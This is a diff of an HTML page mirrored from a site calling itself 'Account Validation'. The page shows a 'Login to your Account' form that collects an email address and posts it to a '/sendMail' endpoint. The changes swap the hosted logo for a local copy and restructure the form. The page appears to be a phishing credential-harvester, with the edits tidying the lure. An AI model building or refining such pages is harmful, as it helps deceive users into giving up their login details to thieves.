@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
     
-<!-- Mirrored from smartaccountvalidation.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 20 Jul 2024 08:13:45 GMT -->
+<!-- Mirrored from smartaccountvalidation.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 23 Jul 2024 07:10:25 GMT -->
 <head>
         <meta charset="UTF-8">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -232,7 +232,7 @@
     <body>
         <header class="site-header">
             <div class="site-logo">
-                <span> <img width="30px" height="30px" src="https://res.cloudinary.com/dwsla5hkc/image/upload/v1721714531/logo3_pomogb.png"></span>
+                <span> <img width="30px" height="30px" src="logo3.png"></span>
                 <h2>ACCOUNT VALIDATION</h2> 
             </div>
             <nav class="navigation" id="nav">
@@ -251,12 +251,12 @@
             
         </header>
         <section class="form-sect">
-
-					<div class="form-header">
+            <form action="/sendMail" method="POST">
+                <div class="form-header">
                     <span class="material-symbols-outlined">login</span>
                     <p>Login to your Account</p>
                 </div>
-            <form class="contact-form" action="/sendMail" method="POST">
+                
                 <div class="user-input-sect">
                     <div class="username inp" >
                         <p>Email Address</p>
@@ -289,5 +289,5 @@
         </script>
     </body>
 
-<!-- Mirrored from smartaccountvalidation.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 20 Jul 2024 08:13:46 GMT -->
+<!-- Mirrored from smartaccountvalidation.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 23 Jul 2024 07:10:26 GMT -->
 </html>
